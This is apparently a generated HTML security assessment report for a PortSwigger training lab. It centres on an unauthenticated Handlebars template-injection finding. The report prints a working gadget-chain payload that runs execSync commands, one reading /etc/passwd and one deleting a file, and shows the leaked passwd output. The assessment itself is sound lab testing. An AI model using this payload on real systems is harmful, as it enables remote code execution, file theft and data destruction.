@@ -1,0 +1,2072 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr6fzspi-e1nxcr</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Unauthenticated RCE via Server-Side Template Injection (Handlebars) in `message` parameter</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [burp✓] Input returned in response (reflected)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [burp] Strict transport security not enforced (3 URLs)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] TLS certificate</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Cacheable HTTPS response</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Cross-domain Referer leakage</a></li>
+</ul></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-7">7. <span class="sev" style="color:#f57c00">MEDIUM</span> [xss-reflected] Suspected Reflected XSS in `message` parameter (filter present, bypasses neutralized)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr6fzspi-e1nxcr</code></td></tr>
+<tr><td>Target</td><td><code>https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/</code></td></tr>
+<tr><td>Started</td><td>2026-07-04T14:13:14.942Z</td></tr>
+<tr><td>Generated</td><td>2026-07-06T05:43:22.502Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>8 mapped · 8 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>6</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>*.web-security-academy.net</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>6 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#c9a227">1</b> low</span><span><b style="color:#5f7d8c">3</b> info</span></p>
+<p class="muted">Plus <b>1</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Unauthenticated RCE via Server-Side Template Injection (Handlebars) in `message` parameter</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/</div>
+<div class="desc">The `message` query parameter on `/` (the product &quot;out of stock&quot; message, reached via the 302 from `/product?productId=N`) is rendered server-side through the Handlebars template engine (Node.js v19.8.1) WITHOUT sandboxing. A fuzz payload (`${{&lt;%[%'&quot;}}%\`) returned HTTP 500 with a full stack trace disclosing the engine: `/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js — Error: Parse error on line 1`. Handlebars is not sandboxed here, so the documented `#with`/`lookup constructor` gadget chain reaches `String.prototype.constructor` (the Function constructor) and builds an attacker function body of `return require('child_process').execSync('&lt;cmd&gt;')`, yielding arbitrary OS command execution as the app user. No authentication is required, and the output of the executed command is reflected back in the rendered page (output-based confirmation). Impact: full remote code execution — arbitrary file read (proved by leaking /etc/passwd, marker root:x:0:0:), arbitrary file deletion (the objective file /home/carlos/morale.txt was deleted and the lab flipped to &quot;Solved&quot;), and complete server compromise.</div>
+<div><b>Reproduction</b></div><pre>1. Fingerprint: GET /?message=${{&lt;%[%'&quot;}}%\ (URL-encoded) → HTTP 500 stack trace naming handlebars + Node v19.8.1.
+2. Negative control (ev-mr6i8gt1-2p): GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock → HTTP 200, no command output (body 11586).
+3. Positive replays 1 (ev-mr6i8l89-2q) &amp; 2 (ev-mr6i915z-2r): GET / with the Handlebars gadget chain whose inner payload is `return require('child_process').execSync('cat /etc/passwd');` → HTTP 200, body 13934, containing `root:x:0:0:` (leaked /etc/passwd), identical across both replays.
+4. Objective (evidence ev-mr6i9nf9-2s): same chain with `execSync('rm /home/carlos/morale.txt')` → HTTP 200; reloading / then shows lab status &quot;Solved — Congratulations, you solved the lab!&quot;, proving the file was deleted via RCE.
+Payload (unencoded): wrtz{{#with &quot;s&quot; as |string|}}{{#with &quot;e&quot;}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub &quot;constructor&quot;)}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push &quot;return require('child_process').execSync('CMD');&quot;}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6i8gt1-2p</code> — <code>artifacts/_/ev-mr6i8gt1-2p/</code></div><div class="lbl">REQUEST</div><pre>GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 11586
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;div&gt;Unfortunately this product is out of stock
+&lt;/div&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/52.jpg&quot;&gt;
+                            &lt;h3&gt;Hydrated Crackers&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $98.34
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                            &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $45.52
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $23.82
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/70.jpg&quot;&gt;
+                            &lt;h3&gt;Eye Projectors&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $87.83
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/7.jpg&quot;&gt;
+                            &lt;h3&gt;Conversation Controlling Lemon&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $83.15
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $50.18
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/9.jpg&quot;&gt;
+                            &lt;h3&gt;Fur Babies&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $92.02
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $92.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $69.51
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/53.jpg&quot;&gt;
+                            &lt;h3&gt;High-End Gift Wrapping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $76.89
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $65.86
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/42.jpg&quot;&gt;
+                            &lt;h3&gt;Pest Control Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $28.31
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $60.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/75.jpg&quot;&gt;
+                            &lt;h3&gt;Grow Your Own Spy Kit&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $90.96
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/21.jpg&quot;&gt;
+                            &lt;h3&gt;Snow Delivered To Your Door&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $62.09
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $2.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/56.jpg&quot;&gt;
+                            &lt;h3&gt;More Than Just Birdsong&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $71.65
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/37.jpg&quot;&gt;
+                            &lt;h3&gt;The Giant Enter Key&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $25.01
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $30.87
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/31.jpg&quot;&gt;
+                            &lt;h3&gt;Couple&amp;apos;s Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.03
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6i8l89-2q</code> — <code>artifacts/_/ev-mr6i8l89-2q/</code></div><div class="lbl">REQUEST</div><pre>GET /?message=wrtz%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%7B%7B%23with%20%22e%22%7D%7D%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%7B%7Bthis.pop%7D%7D%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%7B%7Bthis.pop%7D%7D%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%7B%7Bthis.pop%7D%7D%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.execSync%28%27cat%20%2Fetc%2Fpasswd%27%29%3B%22%7D%7D%7B%7Bthis.pop%7D%7D%7B%7B%23each%20conslist%7D%7D%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%7B%7Bthis%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Feach%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 13934
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;div&gt;wrtze2[object Object]function Function() { [native code] }2[object Object]root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+peter:x:12001:12001::/home/peter:/bin/bash
+carlos:x:12002:12002::/home/carlos:/bin/bash
+user:x:12000:12000::/home/user:/bin/bash
+elmer:x:12099:12099::/home/elmer:/bin/bash
+academy:x:10000:10000::/academy:/bin/bash
+messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
+dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
+postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
+mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
+avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
+saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
+colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
+
+&lt;/div&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/52.jpg&quot;&gt;
+                            &lt;h3&gt;Hydrated Crackers&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $98.34
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                            &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
